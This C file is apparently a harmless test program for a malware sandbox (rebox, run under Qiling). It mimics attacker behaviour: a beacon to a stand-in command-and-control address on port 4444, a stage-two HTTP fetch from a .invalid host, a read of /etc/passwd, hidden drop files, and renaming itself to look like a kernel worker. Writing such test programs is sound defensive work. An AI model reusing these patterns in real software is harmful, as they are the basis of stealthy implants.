/*
 * Harmless behaviour test program for rebox's ELF path. It is only ever run
 * inside the Qiling emulator. Every address and name is reserved for
 * documentation/testing (198.51.100.0/24, *.invalid), and nothing it does
 * would matter on a real machine either.
 *
 * Modes (argv[1]): none = full behaviour script; "loop" = getpid() forever;
 * "spin" = busy loop without syscalls; "thread" = one pthread that writes a file;
 * "connect IP PORT" = one TCP connect + send.
 */
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>
#ifdef WITH_THREADS
#include <pthread.h>
#endif

#define C2_IP "198.51.100.7"
#define C2_PORT 4444
#define HOST "beacon.rebox-test.invalid"
#define DROP "/tmp/.rebox-drop.txt"
#define DROP_CONTENT "rebox test payload\n"

static void write_file(const char *path, const char *text) {
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, text, strlen(text));
        close(fd);
    }
}

#ifdef WITH_THREADS
static void *worker(void *arg) {
    write_file("/tmp/.rebox-thread.txt", (const char *)arg);
    return 0;
}
#endif

int main(int argc, char **argv) {
    if (argc > 1 && !strcmp(argv[1], "loop")) {
        for (;;) getpid();
    }
    if (argc > 3 && !strcmp(argv[1], "connect")) {
        /* connect to argv[2]:argv[3]; used to prove nothing reaches the host network */
        int s = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in a;
        memset(&a, 0, sizeof a);
        a.sin_family = AF_INET;
        a.sin_port = htons(atoi(argv[3]));
        inet_pton(AF_INET, argv[2], &a.sin_addr);
        int r = connect(s, (struct sockaddr *)&a, sizeof a);
        ssize_t w = r == 0 ? send(s, "PING rebox-test", 15, 0) : -1;
        printf("connect=%d send=%d\n", r, (int)w);
        return r == 0 ? 0 : 1;
    }
    if (argc > 1 && !strcmp(argv[1], "spin")) {
        volatile unsigned long n = 0;
        for (;;) n++;
    }
#ifdef WITH_THREADS
    if (argc > 1 && !strcmp(argv[1], "thread")) {
        pthread_t t;
        int r = pthread_create(&t, 0, worker, "from thread\n");
        printf("pthread_create=%d\n", r);
        if (r == 0) pthread_join(t, 0);
        write_file("/tmp/.rebox-after-join.txt", "joined\n");
        return 3;
    }
#endif

    struct utsname u;
    uname(&u);
    printf("hello from %s %s %s\n", u.sysname, u.nodename, u.machine);
    for (int i = 1; i < argc; i++) printf("arg[%d]=%s\n", i, argv[i]);
    const char *e = getenv("REBOX_TEST");
    if (e) printf("env REBOX_TEST=%s\n", e);

    write_file(DROP, DROP_CONTENT);
    mkdir("/tmp/.rebox-dir", 0700);
    chmod(DROP, 0755);
    write_file("/tmp/.rebox-gone.txt", "x");
    unlink("/tmp/.rebox-gone.txt");

    char buf[256];
    int pfd = open("/etc/passwd", O_RDONLY);
    if (pfd >= 0) {
        ssize_t n = read(pfd, buf, sizeof buf - 1);
        close(pfd);
        printf("passwd bytes=%d\n", (int)n);
    }

    /* name resolution through libc: /etc/hosts, /etc/resolv.conf, UDP to port 53 */
    struct addrinfo hints, *res = 0;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    int g = getaddrinfo(HOST, "80", &hints, &res);
    if (g == 0 && res) {
        char ip[64];
        inet_ntop(AF_INET, &((struct sockaddr_in *)res->ai_addr)->sin_addr, ip, sizeof ip);
        printf("resolved %s -> %s\n", HOST, ip);
        int hs = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(hs, res->ai_addr, res->ai_addrlen) == 0) {
            const char *req = "GET /stage2.bin HTTP/1.1\r\nHost: " HOST "\r\nUser-Agent: rebox-test/1.0\r\n\r\n";
            send(hs, req, strlen(req), 0);
        }
        close(hs);
        freeaddrinfo(res);
    } else {
        printf("getaddrinfo failed: %d\n", g);
    }

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &a.sin_addr);
    int r = connect(s, (struct sockaddr *)&a, sizeof a);
    printf("connect=%d\n", r);
    if (r == 0) {
        ssize_t w = send(s, "HELLO rebox-test", 16, 0);
        ssize_t n = recv(s, buf, sizeof buf, 0);
        printf("sent=%d recv=%d\n", (int)w, (int)n);
    }
    close(s);

    int l = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in la;
    memset(&la, 0, sizeof la);
    la.sin_family = AF_INET;
    la.sin_port = htons(2323);
    bind(l, (struct sockaddr *)&la, sizeof la);
    listen(l, 4);
    fcntl(l, F_SETFL, O_NONBLOCK);
    int c = accept(l, 0, 0);
    printf("accept=%d errno=%d\n", c, c < 0 ? errno : 0);
    close(l);

    prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0);

    pid_t pid = fork();
    if (pid == 0) {
        execl("/bin/sh", "sh", "-c", "echo rebox-test > /tmp/.rebox-exec", (char *)0);
        _exit(127);
    }
    int status = -1;
    if (pid > 0) waitpid(pid, &status, 0);
    printf("child %d status=%d\n", (int)pid, status);
    write_file("/tmp/.rebox-after-fork.txt", "parent resumed\n");
    return 7;
}
